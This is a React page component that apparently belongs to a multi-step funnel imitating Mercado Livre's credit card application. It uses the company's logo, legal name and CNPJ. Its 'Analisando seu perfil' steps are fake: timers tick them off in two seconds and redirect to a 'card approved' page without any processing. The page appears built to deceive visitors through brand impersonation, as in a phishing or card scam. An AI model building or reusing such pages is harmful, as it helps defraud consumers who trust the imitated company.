import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import mlLogo from "@/assets/mercado-livre-logo.png";
import { FunnelSteps } from "@/components/FunnelSteps";

export const Route = createFileRoute("/processando")({
  head: () => ({
    meta: [
      { title: "Processando seu pedido - Mercado Livre" },
      { name: "description", content: "Aguarde enquanto processamos a solicitação do seu cartão." },
    ],
  }),
  component: Processando,
});

const steps = [
  "Aguardando resposta",
  "Analisando seu perfil",
  "Preparando seu cartão",
  "Finalizando solicitação",
];

function Processando() {
  const navigate = useNavigate();
  const [current, setCurrent] = useState(0);

  useEffect(() => {
    const timers: ReturnType<typeof setTimeout>[] = [];
    steps.forEach((_, i) => {
      timers.push(setTimeout(() => setCurrent(i + 1), (i + 1) * 400));
    });
    timers.push(setTimeout(() => navigate({ to: "/cartao-aprovado" }), 2000));
    return () => timers.forEach(clearTimeout);
  }, [navigate]);

  return (
    <div className="min-h-screen bg-white flex flex-col relative overflow-hidden">
      <div className="bg-[#F4D147] w-full py-3 flex justify-center items-center shadow-sm">
        <img src={mlLogo} alt="Mercado Livre" className="h-9 object-contain" />
      </div>
      <FunnelSteps current={5} />

      <div className="absolute w-72 h-72 rounded-full bg-[#F4D147]/20 -top-20 -right-20 z-0" />
      <div className="absolute w-56 h-56 rounded-full bg-[#F4D147]/10 -bottom-16 -left-16 z-0" />

      <main className="flex-1 flex items-start justify-center px-4 py-8 relative z-10">
        <div className="w-full max-w-md bg-white rounded-xl shadow-md p-6 md:p-8">
          <h1 className="text-2xl md:text-3xl font-bold text-gray-800 text-center mb-6">
            Aguarde enquanto processamos seu pedido
          </h1>


          <div className="space-y-4">
            {steps.map((label, i) => {
              const done = i < current;
              const active = i === current;
              return (
                <div key={label} className="flex items-center justify-between border-b border-gray-100 pb-3 last:border-0">
                  <span className={`font-semibold ${done ? "text-gray-800" : active ? "text-gray-800" : "text-gray-500"}`}>
                    {label}
                  </span>
                  {done ? (
                    <span className="w-6 h-6 rounded-full bg-[#F4D147] text-gray-900 flex items-center justify-center text-xs">
                      ✓
                    </span>
                  ) : active ? (
                    <span className="w-6 h-6 rounded-full border-2 border-[#F4D147] border-t-transparent animate-spin" />
                  ) : (
                    <span className="w-6 h-6 rounded-full border border-gray-300" />
                  )}
                </div>
              );
            })}
          </div>
        </div>
      </main>

      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
        <p className="mt-1">
          CNPJ: 10.573.521/0001-91 ·{" "}
          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
          <a href="#" className="text-gray-900">Privacidade</a>
        </p>
      </footer>
    </div>
  );
}
